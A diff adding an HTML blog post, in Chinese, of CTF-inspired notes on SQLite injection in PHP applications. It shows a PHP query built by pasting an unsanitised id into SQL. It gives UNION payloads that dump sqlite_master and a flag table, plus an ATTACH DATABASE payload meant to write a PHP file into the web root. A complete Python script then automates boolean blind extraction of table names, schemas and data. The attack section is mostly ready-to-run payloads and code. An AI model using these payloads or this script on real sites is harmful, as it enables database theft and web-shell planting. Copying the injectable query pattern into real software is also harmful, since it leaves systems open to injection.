@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>sqlite注入以及PHP使用sqlite笔记 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      sqlite注入以及PHP使用sqlite笔记
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前比赛被sqlite注入坑了，网上能找到的资料比较少，不过已经足够了，在此做一下笔记。</p>
+<h3 id="PHP使用SQLITE"><a href="#PHP使用SQLITE" class="headerlink" title="PHP使用SQLITE"></a>PHP使用SQLITE</h3><ul>
+<li><strong>连接数据库</strong></li>
+</ul>
+<p>PHP中自带处理sqlite的类，要使用直接继承SQLite3类然后重写构造方法<code>__construct()</code>指定db文件</p>
+<pre><code class="php">class MyDB extends SQLite3
+   {
+      function __construct()
+      {
+         $this-&gt;open(&#39;test.db&#39;);
+      }
+   }</code></pre>
+<p>实例化类，判断是否连接成功</p>
+<pre><code class="php">$db = new MyDB();
+   if(!$db){
+      echo $db-&gt;lastErrorMsg();
+   } else {
+      echo &quot;Opened database successfully\n&quot;;
+   }</code></pre>
+<ul>
+<li>执行SQL语句，以查询为例，其他与mysql无异。</li>
+</ul>
+<pre><code class="php">$sql =&lt;&lt;&lt;EOF
+      SELECT * from hex where id = &#39;$id&#39;;
+EOF;
+$result = $db-&gt;query($sql);
+$data = $result-&gt;fetchArray(SQLITE3_ASSOC);
+echo $data[&#39;hex&#39;];</code></pre>
+<h3 id="SQLITE的注入"><a href="#SQLITE的注入" class="headerlink" title="SQLITE的注入"></a>SQLITE的注入</h3><h5 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h5><ul>
+<li>sqlite3和mysql5.5以后一样存在一个表记录了数据库和表的信息。</li>
+</ul>
+<p><img src="C:%5CUsers%5C51763%5CDesktop%5C894761-20160811111720934-461357319.png" alt="894761-20160811111720934-461357319"></p>
+<ul>
+<li>可以看到记录了表名，表结构，那么我们就可以直接通过这个隐藏表来查询sqlite数据库里面的表名。</li>
+</ul>
+<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(name)from sqlite_master)--+</code></pre>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701606229929.png" alt="img"></p>
+<ul>
+<li>查看表结构<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(sql)from sqlite_master where name=&#39;flag&#39;)--+</code></pre>
+</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701607258796.png" alt="img"></p>
+<ul>
+<li>查看数据<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(flag)from flag where id=&#39;1&#39;)--+</code></pre>
+</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701608704994.png" alt="img"></p>
+<ul>
+<li>写文件(实验失败)</li>
+</ul>
+<pre><code>http://127.0.0.1/?id=1&#39;;ATTACH DATABASE &#39;E:\\phpStudy\\PHPTutorial\\WWW\\xiaozi.php&#39; AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES (&#39; &lt;?php phpinfo(); ?&gt; &#39;); --</code></pre><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>bool盲注：</p>
+<ul>
+<li><strong>检测表的个数</strong></li>
+</ul>
+<pre><code class="sqlite">&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=表的个数</code></pre>
+<ul>
+<li><p>payload解释</p>
+<p>COUNT()检测表的个数，用于爆破表个数</p>
+</li>
+<li><p>自动检测脚本编写</p>
+</li>
+</ul>
+<pre><code class="python">def tables_count(self):
+            for i in range(1,255):
+                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
+                result = self.r.get(payload)
+                if result.text == self.contents:
+                    print(&#39;Tables count is %d&#39;%(i))</code></pre>
+<hr>
+<ul>
+<li><strong>检测表名长度</strong></li>
+</ul>
+<pre><code class="python">&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit 第几个表名,1)=长度 --+</code></pre>
+<ul>
+<li><p>payload解释</p>
+<p>LENGTH()用于检测字符串长度，limit限定第一条数据以爆破字符长度</p>
+</li>
+<li><p>自动检测脚本demo</p>
+</li>
+</ul>
+<pre><code class="python">def table_name_len(self,count):
+            for j in range(0,count):
+                for i in range(1,255):
+                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))</code></pre>
+<ul>
+<li><strong>爆表名</strong></li>
+</ul>
+<pre><code class="sqlite">?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1)=&#39;f&#39; --+
+或者
+?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1) like &#39;a&#39; --+</code></pre>
+<ul>
+<li>payload解释</li>
+</ul>
+<pre><code class="sqlite">substr((payload),第几位,步长)
+例如:
+substr((payload),1,1)=&#39;f&#39; --判断第一位字符是不是f</code></pre>
+<ul>
+<li>自动脚本编写</li>
+</ul>
+<pre><code class="python">def table_name(self,count,num):
+            tablename = &#39;&#39;
+            for j in range(count):
+                for i in range(40,125):
+                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
+                    result=self.r.get(payload)
+                    if result.text == self.contents:
+                        tablename = tablename +str(chr(i))
+            self.table_structure(tablename)
+            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))</code></pre>
+<ul>
+<li><p><strong>爆表结构</strong></p>
+<p>爆表结构也就是爆sqlite_master的sql字段，与爆表名类似</p>
+</li>
+<li><p>自动脚本编写</p>
+<pre><code class="python">def table_structure(self,tablename):
+          tablecolums = &#39;&#39;
+          for i in range(1,255):
+                  payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
+                  result = self.r.get(payload)
+                  if result.text == self.contents:
+                      len_sql=i
+          for j in range(len_sql+1):
+              for i in range(40,125):
+                  payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
+                  result=self.r.get(payload)
+                  if result.text == self.contents:
+                      tablecolums = tablecolums +str(chr(i))
+          print(tablecolums)            </code></pre>
+</li>
+<li><p>爆数据</p>
+<p>爆数据也就是得知表结构之后，直接爆破对应的表名和表字段。</p>
+</li>
+</ul>
+<pre><code class="python">def get_data(self,colums,table):
+            data=&#39;&#39;
+            for i in range(1,255):
+                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        len_data=i
+                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
+                    sys.stdout.flush()
+
+            for j in range(len_data+1):
+                for i in range(40,125):
+                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        data = data +str(chr(i))
+                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
+                    else:
+                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
+                    sys.stdout.flush()
+            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)</code></pre>
+<ul>
+<li>整合脚本：</li>
+</ul>
+<pre><code class="python">import requests
+import sys
+class sqlite3inject:
+        r =&#39;&#39;
+        contents =&#39;&#39;
+        url =&#39;&#39;
+        HEADER = &#39;\033[95m&#39;
+        OKBLUE = &#39;\033[94m&#39;
+        OKGREEN = &#39;\033[92m&#39;
+        WARNING = &#39;\033[93m&#39;
+        FAIL = &#39;\033[91m&#39;
+        ENDC = &#39;\033[0m&#39;        
+        def __init__(self,url):
+            self.url = url
+            self.r = requests.session()
+            self.contents = (self.r.get(self.url)).text
+
+        def get_data(self,colums,table):
+            data=&#39;&#39;
+            for i in range(1,255):
+                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        len_data=i
+                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
+                    sys.stdout.flush()
+
+            for j in range(len_data+1):
+                for i in range(40,125):
+                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        data = data +str(chr(i))
+                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
+                    else:
+                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
+                    sys.stdout.flush()
+            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)
+
+        def table_structure(self,tablename):
+            tablecolums = &#39;&#39;
+            for i in range(1,255):
+                    payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        len_sql=i
+            for j in range(len_sql+1):
+                for i in range(40,125):
+                    payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
+                    result=self.r.get(payload)
+                    if result.text == self.contents:
+                        tablecolums = tablecolums +str(chr(i))
+            print(tablecolums)            
+        def table_name(self,count,num):
+            tablename = &#39;&#39;
+            for j in range(count):
+                for i in range(40,125):
+                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
+                    result=self.r.get(payload)
+                    if result.text == self.contents:
+                        tablename = tablename +str(chr(i))
+            self.table_structure(tablename)
+            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))
+
+        def table_name_len(self,count):
+            for j in range(0,count):
+                for i in range(1,255):
+                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
+                    result = self.r.get(payload)
+                    if result.text == self.contents:
+                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))
+                        self.table_name(i+1,j)
+
+
+        def tables_count(self):
+            for i in range(1,255):
+                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
+                result = self.r.get(payload)
+                if result.text == self.contents:
+                    print(&#39;Tables count is %d&#39;%(i))
+                    return self.table_name_len(i)
+
+inject = sqlite3inject(&#39;http://127.0.0.1/?id=1&#39;)        
+inject.tables_count()</code></pre>
+<ul>
+<li>测试效果</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701919083104.png" alt="img"></p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-10-04T03:17:45.000Z" itemprop="datePublished">2019-10-04</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-10-4-sqlite注入以及PHP使用sqlite" data-title="sqlite注入以及PHP使用sqlite笔记" data-url="http://www.plasf.cn/2019/10/04/2019-10-4-sqlite注入以及PHP使用sqlite/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
